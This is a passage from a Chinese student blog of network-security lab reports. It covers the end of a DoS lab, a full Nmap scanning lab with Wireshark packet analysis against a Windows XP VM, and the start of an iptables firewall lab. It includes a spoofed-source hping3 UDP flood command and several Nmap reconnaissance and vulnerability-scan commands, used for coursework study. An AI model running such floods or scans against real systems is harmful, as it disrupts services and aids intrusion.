<p><img src="/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img13.png" alt="图13 UDP端口扫描"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -sU 192.168.32.128</span><br></pre></td></tr></table></figure>

<p>实施攻击</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> hping3 --udp -s 6666 -p 123 -a 8.8.8.8 --flood 192.168.32.128</span><br></pre></td></tr></table></figure>

<p><img src="/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img14.png" alt="图14 UDP Flood攻击命令"></p>
<p><img src="/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img15.png" alt="图15 攻击前ping结果"></p>
<p><img src="/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img16.png" alt="图16 攻击前CPU使用情况"></p>
<p>（未进行DoS攻击前）</p>
<p><img src="/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img17.png" alt="图17 攻击后ping结果"></p>
<p><img src="/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img18.png" alt="图18 攻击后CPU使用情况"></p>
<p>（DoS攻击后）</p>
<p>可以明显看到DoS攻击前后ping靶机的time变化，DoS攻击后time的时间大大增加，并且访问时间变慢，CPU使用增多，靶机已经打不开界面。</p>
<h4 id="步骤三：运行抓包工具，根据抓包结果对DoS攻击进行验证分析"><a href="#步骤三：运行抓包工具，根据抓包结果对DoS攻击进行验证分析" class="headerlink" title="步骤三：运行抓包工具，根据抓包结果对DoS攻击进行验证分析"></a>步骤三：运行抓包工具，根据抓包结果对DoS攻击进行验证分析</h4><p>1.SYN Flood</p>
<p>用攻击机kali进行抓包，发现只有向靶机发送的大量包，收不到访问靶机80端口的返回包（靶机由于DOS攻击无法打开抓包），并且我们可以看到大量向靶机的SYN请求。也可以看到具体的TCP请求。</p>
<p><img src="/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img19.png" alt="图19 SYN Flood抓包结果"></p>
<p><img src="/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img20.png" alt="图20 TCP请求详情"></p>
<p>2.UDP Flood</p>
<p>用攻击机kali进行抓包，发现只有向靶机发送的大量包，收不到访问靶机80端口的返回包。（靶机由于DoS攻击无法打开抓包），并且我们可以看到向靶机的大量UDP请求。也可以看到具体的UDP请求。</p>
<p><img src="/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img21.png" alt="图21 UDP Flood抓包结果"></p>
<p><img src="/2025/10/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img22.png" alt="图22 UDP请求详情"></p>
<h4 id="分析比较两种攻击方法"><a href="#分析比较两种攻击方法" class="headerlink" title="分析比较两种攻击方法"></a>分析比较两种攻击方法</h4><p>1.原理：</p>
<p>UDP FLOOD攻击：攻击机向靶机同一端口发送多个UDP数据包，占用靶机资源，使靶机无法提供相关服务，从而使其与UDP相关的服务瘫痪。</p>
<p>SYN FLOOD攻击：攻击机向靶机发送SYN数据包，建立TCP连接后，一直不完成三次握手，即与靶机建立多个TCP连接使靶机的资源耗尽，从而使其与TCP相关的服务瘫痪。</p>
<p>2.攻击差别：</p>
<p>UDP FLOOD攻击个人理解是流氓攻击，一直占用资源，使靶机毫无还手之力。SYN FLOOD攻击当靶机有足够的资源进行回复时，还是可以访问其他网站的，即SYN FLOOD攻击不彻底。</p>
<h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p>在这次实验中，我系统性地开展了针对拒绝服务（DoS）攻击的实践研究。通过使用hping3等网络工具，我们成功实施了SYN Flood与UDP Flood等类型的攻击，并深入观察了攻击对目标系统（Windows XP）产生的实际影响。</p>
<p>实验过程中，我通过持续监测靶机的网络延迟、系统资源占用率以及服务可用性，直观地验证了DoS攻击的破坏性效果。攻击期间，靶机的响应时间显著增加，甚至出现服务无响应的情况。借助Wireshark等抓包工具，我们清晰地捕捉并分析了攻击过程中的数据包交换细节，例如大量伪造源IP的SYN请求包，加深了对攻击流量特征的认识。</p>
<p>通过本次实验，我不仅掌握了DoS攻击的基本原理与实施方法，更重要的是学会了如何从防御者的角度识别和缓解此类威胁。这次实践极大地提升了我的网络攻防实战能力，并对未来如何有效保障网络服务的安全性具备了更深刻的理解。</p>
]]></content>
      <categories>
        <category>第5学期实验</category>
        <category>网络安全实验</category>
      </categories>
      <tags>
        <tag>北邮</tag>
        <tag>实验</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实验3：网络扫描</title>
    <url>/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="网络扫描实验"><a href="#网络扫描实验" class="headerlink" title="网络扫描实验"></a>网络扫描实验</h2><h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><p>用Nmap对主机进行主机扫描、ping扫描、端口扫描、TCP connect扫描、操作系统识别、漏洞扫描等，获取尽可能全面的主机信息，抓包分析扫描原理；</p>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>（1） 扫描机：Kali，配置nmap工具；</p>
<p>（2） 靶机：Windows XP；</p>
<p>（3） 软件：Nmap、wireshark</p>
<h3 id="实验过程与结果"><a href="#实验过程与结果" class="headerlink" title="实验过程与结果"></a>实验过程与结果</h3><h4 id="步骤一：查看主机信息"><a href="#步骤一：查看主机信息" class="headerlink" title="步骤一：查看主机信息"></a>步骤一：查看主机信息</h4><p>1.在扫描机Kali中打开终端，输入“ifconfig”命令查看扫描机信息，如下图所示可知扫描机的ip地址为192.168.204.134。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img1.png" alt="图1"></p>
<p>2.在靶机windows XP中打开命令行，使用“ipconfig”命令查看靶机信息，如下图所示可知靶机的ip地址为192.168.204.135。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img2.png" alt="图2"></p>
<p>3.在扫描机kali终端中使用ping 192.168.204.135命令ping靶机，按“ctrl+c”停止，如下图所示，收到来自靶机的答复，说明扫描机ping通靶机。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img3.png" alt="图3"></p>
<p>4.在靶机windows XP命令行中使用ping 192.168.204.134命令ping扫描机，如下图所示，收到来自扫描机的答复，说明靶机ping通扫描机。至此，两主机实现ping通。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img4.png" alt="图4"></p>
<h4 id="步骤二：Nmap-Ping扫描"><a href="#步骤二：Nmap-Ping扫描" class="headerlink" title="步骤二：Nmap Ping扫描"></a>步骤二：Nmap Ping扫描</h4><p>1.在扫描机终端中使用<strong>nmap -sP 192.168.204.135&#x2F;24</strong>命令，对靶机进行Ping扫描，收集C段内部属 于目标的IP地址。如下图终端输出的扫描结果可知，成功扫描到网关192.168.204.2、靶机192.168.204.135、扫描机192.168.204.134。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img5.png" alt="图5"></p>
<p>2.在扫描机kali终端输入<strong>sudo su</strong>获取超级用户权限，接着输入<strong>wireshark</strong>，在超级用户权限下打开wireshark。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img6.png" alt="图6"></p>
<p>3.进行扫描的同时打开wireshark捕获报文，捕获结果如下图所示。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img7.png" alt="图7"></p>
<p>4.在上图中可以看到，wireshark在此次主机扫描过程中捕获到若干TCP包、DNS包和大量由物理地址00:0c:29:a5:82:6c广播的ARP包。</p>
<p>（1）前三个TCP包：由扫描机kali向IP地址192.168.204.1和198.168.204.2的80端口均发出TCP请求SYN，稍后由192.168.204.2回复给扫描机[RST,ACK]。说明此IP地址对应网关，且网关的80端口未打开。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img8.png" alt="图8"></p>
<p>（2）由扫描机kali广播发送若干ARP包：扫描机依次对IP地址192.168.204.3-253进行查询，要求查询结果发送回扫描机192.168.204.134。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img9.png" alt="图9"></p>
<p>（3）靶机发送ARP包：当扫描机发出查询IP地址192.168.117.133的ARP包后，靶机向扫描机发送ARP包，告知扫描机其IP地址所对应的Mac地址为00:0c:29:a5:82:6c。</p>
<p>（4）扫描机和靶机间交换TCP包：扫描机向靶机80端口发送TCP建立连接请求，稍后由靶机80端口返回[RST,ACK]，说明此主机是开启的。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img10.png" alt="图10"></p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img11.png" alt="图11"></p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img12.png" alt="图12"></p>
<p>（5）扫描机和网关间交换DNS包：在发送ARP包对c段各IP地址都进行了一遍查询之后，扫描机192.168.204.134和网关192.168.204.2之间交换DNS报文进行域名解析。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img13.png" alt="图13"></p>
<p>5.由以上分析可知，Nmap Ping扫描的原理是通过发送ARP包对c段所有IP进行查询，主机回复ARP包告知其Mac地址后，对查询到的主机80端口进行TCP连接请求，若收到回复则确认该主机开启。最终终端查询结果输出全部查询到的主机IP地址。</p>
<h4 id="步骤三：Nmap主机扫描"><a href="#步骤三：Nmap主机扫描" class="headerlink" title="步骤三：Nmap主机扫描"></a>步骤三：Nmap主机扫描</h4><p>1.使用<strong>nmap -A 192.168.204.135</strong>命令对靶机Windows XP进行主机扫描。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img14.png" alt="图14"></p>
<p>2.对靶机主机进行扫描的同时打开wireshark捕获报文，捕获结果如下图所示。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img15.png" alt="图15"></p>
<p>3.由上图可知，捕获到两个ARP包、若干TCP包和若干DNS协议包。</p>
<p>（1）ARP包：首先由Mac地址为00:0c:29:a5:82:6c的扫描机广播发出ARP包，查询扫描目标IP地址所对应的Mac地址，靶机收到后向扫描机回复ARP包说明其Mac地址为00:0c:29:5d:e8:c3。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img16.png" alt="图16"></p>
<p>（2）TCP包：查看发送方地址Source和接收方地址Destination可知，这些TCP包在扫描机kali和靶机windows XP之间传送。</p>
<p>a）首先由扫描机发出TCP请求包，分别向靶机80和443端口发送SYN，这两个端口是常用的HTTP和HTTPs服务端口。</p>
<p>b）靶机80和443端口均回复扫描机[RST,ACK]拒绝建立连接，说明主机在线。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img17.png" alt="图17"></p>
<p>3.DNS包：同主机扫描中的分析，扫描机192.168.204.134和网关192.168.204.2交换DNS协议包进行域名解析。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img18.png" alt="图18"></p>
<p>4.由以上分析可知，Nmap主机扫描的原理是发送ARP包确定扫描目的IP所对应的Mac地址后，向目标IP的80和443端口发送建立TCP连接请求，收到TCP应答报文则说明主机在线。</p>
<p>5.由Ping扫描和主机扫描分析的共同点可知，每次对靶机进行扫描前都需要扫描机发送ARP包查询靶机Mac地址，收到靶机ARP回复后开始扫描；而每次扫描也都需要扫描机与网关交换DNS报文进行域名解析。这些共同点在接下来的扫描原理分析中不再赘述。</p>
<h4 id="步骤四：端口扫描"><a href="#步骤四：端口扫描" class="headerlink" title="步骤四：端口扫描"></a>步骤四：端口扫描</h4><h5 id="sV：探测开放端口以确定服务-版本信息"><a href="#sV：探测开放端口以确定服务-版本信息" class="headerlink" title="-sV：探测开放端口以确定服务&#x2F;版本信息"></a>-sV：探测开放端口以确定服务&#x2F;版本信息</h5><p>1.在扫描机kali终端使用<strong>nmap -sV 192.168.204.135</strong>命令对靶机进行端口扫描，在终端输出的扫描结果如下图所示。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img19.png" alt="图19"></p>
<p>2.扫描结果显示，靶机所开启的端口有135、139、445端口，并列出了端口对应的服务和版本。</p>
<p>3.验证靶机以上端口打开：在靶机命令行中输入<strong>telnet 192.168.204.135+端口号</strong>检测对应端口是否打开，如下两图所示，端口号为80时输出“连接失败”说明靶机80端口未开放；而端口号为135时跳转到“Telnet 192.168.204.135”界面说明靶机135端口已开放，端口139、445同理。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img20.png" alt="图20"></p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img21.png" alt="图21"></p>
<p>4.在进行上述端口扫描的同时使用wireshark捕获网络流量，如下图所示。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img22.png" alt="图22"></p>
<p>5.由上图可知，除了用于查询靶机和网关Mac地址的ARP包以及用于域名解析的DNS包，wireshark还捕获到若干TCP包。这些TCP包均为扫描机和靶机之间交换的，每次由扫描机向靶机各个端口发送TCP建立连接请求。</p>
<p>（1）若靶机此端口未开放，则回复给扫描机[RST,ACK]连接失败。如下图所示，靶机443端口关闭。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img23.png" alt="图23"></p>
<p>（2）若靶机此端口已开放，则回复给扫描机[SYN,ACK]，再由扫描机发送给靶机[ACK]，完成三次握手建立TCP连接。如下图所示，扫描机33136端口成功和靶机135端口建立TCP连接，说明靶机135端口已开放。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img24.png" alt="图24"></p>
<p>同理如下两图所示，可以看到扫描机成功和139端口、445端口建立TCP连接。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img25.png" alt="图25"></p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img26.png" alt="图26"></p>
<p>（3）扫描结束时，靶机的135端口、139端口和445端口都向扫描机发送[FIN,ACK]，扫描机回复[ACK]，再由靶机发送[FIN,ACK]，扫描机最终发送[ACK]，完成四次挥手，TCP连接终止。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img27.png" alt="图27"></p>
<p>6.由以上分析可知，Nmap -sV端口扫描的原理是由扫描机向靶机各端口发送TCP建立连接请求，若经历三次握手建立连接则说明此端口开启，最终通过四次挥手终止连接，否则说明此端口关闭。</p>
<h5 id="sS：TCP-SYN扫描，半开扫描"><a href="#sS：TCP-SYN扫描，半开扫描" class="headerlink" title="-sS：TCP SYN扫描，半开扫描"></a>-sS：TCP SYN扫描，半开扫描</h5><p>1.在扫描机kali终端输入<strong>nmap -sS 192.168.204.135</strong>命令对靶机端口进行TCP SYN扫描。终端输出的扫描结果如下图所示，可知靶机135端口、139端口、445端口开启，并列出了端口对应的版本信息。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img28.png" alt="图28"></p>
<p>2.在上述TCP SYN端口扫描的同时，使用wireshark捕获网络流量，捕获结果如下图所示。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img29.png" alt="图29"></p>
<p>3.由上图可知，捕获到了大量扫描机和靶机间交换的TCP包。扫描机向靶机各个端口发送TCP建立连接请求[SYN]。</p>
<p>（1）若端口关闭，则回复给扫描机TCP报文[RST,ACK]，连接失败说明靶机该端口关闭。如下图的3306端口</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img30.png" alt="图30"></p>
<p>（2）若端口开放，则靶机回复给扫描机[SYN,ACK]，稍后由主机回复[RST]终止建立连接。如下图所示靶机139端口为例。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img31.png" alt="图31"></p>
<p>4.由以上分析可知，Nmap -sS端口扫描（TCP SYN扫描，半开扫描）由扫描机向靶机各个端口发送TCP建立连接请求，若靶机端口回复[SYN,ACK]则说明该端口开启，扫描机回复[RST]终止连接，并不完整地建立TCP连接。</p>
<p>5.将两种端口扫描进行比较，-sV端口扫描耗时7.74秒，-sS端口扫描耗时仅1.42秒，可知由于TCP SYN端口扫描未建立完整的TCP连接，扫描速度更快、更加省时高效；而-sV模式由于建立了完整的TCP连接，相对更加完整可靠。</p>
<h4 id="步骤五：操作系统扫描"><a href="#步骤五：操作系统扫描" class="headerlink" title="步骤五：操作系统扫描"></a>步骤五：操作系统扫描</h4><p>1.在扫描机终端输入<strong>sudo su</strong>进入超级用户权限，在root权限下使用<strong>nmap -O 192.168.204.135</strong>命令启用操作系统检测，对靶机进行操作系统扫描。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img32.png" alt="图32"></p>
<p>2.由上图终端输出的扫描结果可知，操作系统扫描得出靶机的开放端口分别是135、139、445端口，并输出其Mac地址、设置类型、操作系统类型及其CPE信息、操作系统细节，并说明靶机与扫描机的网络距离为1跳。</p>
<p>3.在进行上述操作系统扫描的同时，在扫描机中打开wireshark对网络流量进行捕获，捕获结果如下图所示。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img33.png" alt="图33"></p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img34.png" alt="图34"></p>
<p>4.由上图捕获结果可知，除了进行主机发现的ARP包和与网关间进行域名解析的DNS包，wireshark还捕获到若干TCP包、一个UDP包和几个ICMP包。</p>
<p>（1）TCP包：在扫描机192.168.204.134和靶机192.168.204.135之间交换。</p>
<p>a）建立TCP连接请求部分与TCP SYN半开端口扫描同理，由扫描机向靶机各个端口发送[SYN]请求，若靶机该端口开放则回复[SYN,ACK]，再由扫描机回复[RST]拒绝TCP连接；若靶机该端口关闭则回复[RST,ACK]，建立TCP连接失败。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img35.png" alt="图35"></p>
<p>b）在对靶机端口全部扫描完毕后，扫描机向已知开放的靶机139端口再次发送[SYN]，收到[SYN,AKC]回复后向其回复[SYN]经历三次握手成功建立TCP连接。随后扫描机又向靶机139端口发送了了[SYN,ECN,CWR,Reserved]，表示拥塞通知，告诉靶机139端口减小拥塞窗口，在靶机回复[SYN,ACK]后扫描机仍回复[RST]拒绝连接。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img36.png" alt="图36"></p>
<p>（2）UDP包：在对靶机端口半开扫描结束后，扫描机发送UDP报文到靶机主机32652端口，靶机随后回复ICMP包显示端口不可达。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img37.png" alt="图37"></p>
<p>（3）ICMP包：利用ping命令验证网络的连通性并统计响应时间和TTL（IP包生存周期）。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img38.png" alt="图38"></p>
<p>5.由以上分析可知，Nmap操作系统扫描通过发送一系列TCP和UDP报文到远程主机并检查响应中的每一个比特，将其与TCP&#x2F;IP协议栈fingerprinting数据库中的已知操作系统进行比较，打印匹配出的操作系统详细信息即可告知用户靶机操作系统的详细信息。</p>
<h4 id="步骤六：漏洞扫描"><a href="#步骤六：漏洞扫描" class="headerlink" title="步骤六：漏洞扫描"></a>步骤六：漏洞扫描</h4><p>1.在扫描机kali终端使用<strong>nmap 192.168.204.135 -script&#x3D;vuln</strong>命令进行靶机常见漏洞扫描，终端输出的扫描结果如下三图所示。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img39.png" alt="图39"></p>
<p>2.在以上扫描过程中，打开wireshark对网络流量进行捕获，捕获结果如下两图所示。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img40.png" alt="图40"></p>
<p>3.由图中捕获结果可知，除了进行主机发现的ARP包和与网关间进行域名解析的DNS包，wireshark还捕获到大量TCP包、SSLv3包、SMB包和NBNS包。</p>
<p>（1）TCP包：在扫描机192.168.204.134和靶机192.168.204.135之间交换数据，扫描机向靶机各端口发送TCP连接建立请求[SYN]，若靶机该端口开放则回复[SYN,ACK]，再由扫描机回复[ACK]完成三次握手，成功与此端口建立 TCP连接；若该端口未开放则回复[RST,ACK]建立TCP连接失败。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img41.png" alt="图41"></p>
<p>（2）SSLv3包、SMB包和NBNS包：首先由扫描机向靶机发送内容未Client Hello的SSLv3包建立连接；随后由扫描机向靶机发送NBNS包请求NBSTAT端口查询服务，靶机收到后发送NBNS包回复NBSTAT服务开启；之后由扫描机向靶机发送SMB negotiate protocol request请求数据报并列出它所支持的所有的SMB协议版本，靶机收到请求信息后响应请求并列出希望使用的协议版本。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img42.png" alt="图42"></p>
<p>（3）在收到靶机回复前，扫描机向靶机445端口发送TCP连接建立请求[SYN]，收到445端口回复的[SYN.ACK]后向靶机回复[ACK]成功建立TCP连接进行通信。</p>
<p>4.由以上分析可知，Nmap漏洞扫描是扫描机首先通过向各端口发送TCP连接建立请求扫描靶机开放的端口，随后每次向靶机发送SMB报文并与开放的445端口建立TCP连接进行通信后，靶机回复SMB报文即为对相应漏洞的扫描结果。</p>
<h4 id="步骤七：主机全面扫描"><a href="#步骤七：主机全面扫描" class="headerlink" title="步骤七：主机全面扫描"></a>步骤七：主机全面扫描</h4><p>1.在扫描机kali终端输入<strong>nmap -T4 -A 192.168.204.135</strong>对靶机进行完整全面的扫描。其中-A选项用于使用进攻性方式扫描；-T4指定扫描过程使用的时序，总共6个级别（0-5），级别越高扫描速度越快，但也越易被防火墙&#x2F;IDS检测并屏蔽掉，在网络状况良好的情况推荐使用T4。终端输出的扫描结果如下两图所示。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img43.png" alt="图43"></p>
<p>2.由扫描结果可知，全面扫描靶机得到主机发现的结果为“Host is up”；端口扫描的结果为共997个关闭端口、3个开放端口分别为135、139、445端口，并列出开放端口的对应服务和版本信息；操作系统扫描的结果为靶机OS为windows XP并输出其CPE信息等；版本侦测扫描的结果为对扫描到的开放状况进一步探测端口上运行的具体的应用程序和版本信息；并调用NSE脚本进行进一步的信息挖掘的显示结果。</p>
<p>3.在进行上述扫描的同时，打开wireshark对网络流量进行捕获，捕获结果如下图所示。</p>
<p><img src="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/img44.png" alt="图44"></p>
<p>4.由上图捕获结果可知，wireshark捕获到ARP包及DNS包还有大量TCP和UDP包、ICMP包、SMB包、SMB2包及NBSS包。</p>
<p>（1）ARP包：主机发现。</p>
<p>（2）TCP包：端口扫描。</p>
<p>（3）TCP和UDP包、ICMP包：操作系统扫描及版本侦测。</p>
<p>（4）SMB包、SMB2包、NBSS包：调用NSE脚本进行进一步的信息挖掘。</p>
<h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p>本次实验使我得以将网络扫描技术从理论层面延伸至具体的动手实践，完成了一次对目标靶机的系统性探测与分析。我以Nmap为核心工具，展开了一条从宏观发现到深度探测的完整路径。实验始于基础的主机发现，通过Ping扫描快速定位了网络中的活跃设备；继而深入到端口扫描，对比体验了TCP SYN半开扫描的高效与TCP Connect全连接扫描的可靠性，并尝试了探测UDP服务这一更具挑战性的任务；随后，通过服务版本侦测和操作系统识别，将单纯的端口号转化为更具价值的情报信息；最终，借助Nmap强大的脚本引擎，我对靶机进行了初步的漏洞扫描，将之前获取的信息与已知的安全风险关联起来。</p>
<p>整个过程中，我同步使用Wireshark进行网络流量抓取与分析，这项工作是本次实验的精华所在。当在终端中执行一条条Nmap命令时，Wireshark如同一个高精度的“显微镜”，让我得以窥见命令背后真实的网络对话。例如，我清晰地观察到TCP SYN扫描如何通过发送SYN包、接收SYN&#x2F;ACK包后即刻发送RST包来中断连接，从而验证了其“半开扫描”的高效原理。与之形成鲜明对比的是，TCP Connect扫描则展示了完整的三次握手过程，这使我深刻理解了两种扫描方式在系统调用层级和隐蔽性上的根本差异。而对操作系统识别过程的抓包分析则更为有趣，我看到Nmap并非进行单一请求，而是发送一系列精心构造的、带有特殊TCP参数的探测包，通过分析目标系统独特的响应“指纹”来推断其操作系统。这种将扫描命令与底层网络流量相互印证的过程，极大地深化了我对网络协议和扫描技术内在机制的理解。</p>
<p>经过这次亲自动手的实验，我所获得的远不止是几个命令的使用技巧。它让我真切地体会到，一次看似简单的扫描背后，是大量网络数据包的交互与博弈，信息安全的攻防在最底层便已悄然展开。这极大地提升了我对网络安全隐患的警觉性。我认识到，网络中开放的端口、未更新补丁的服务、甚至是系统本身透露的指纹信息，都可能成为攻击者利用的突破口。因此，作为一名安全实践者，必须时刻保持主动防御的意识，不仅要熟练掌握漏洞扫描这一关键技能，更要理解其原理以应对可能的规避手段，同时还要坚持定期更新漏洞库，不断提升扫描技术的深度与广度。唯有如此，才能在这场动态的攻防较量中，更有效地发现隐患、评估风险，从而切实提升网络的整体安全水位。</p>
]]></content>
      <categories>
        <category>第5学期实验</category>
        <category>网络安全实验</category>
      </categories>
      <tags>
        <tag>北邮</tag>
        <tag>实验</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实验4：防火墙</title>
    <url>/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="防火墙课堂实验"><a href="#防火墙课堂实验" class="headerlink" title="防火墙课堂实验"></a>防火墙课堂实验</h2><h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><p>1.学习iptables防火墙基本操作。</p>
<p>2.设置iptables防火墙的包过滤规则，分别实现以下功能：</p>
<p>（1）禁止所有主机ping本地主机；</p>
<p>（2）仅允许某特定IP主机ping本地主机；</p>
<p>（3）允许每10秒钟通过1个ping包；</p>
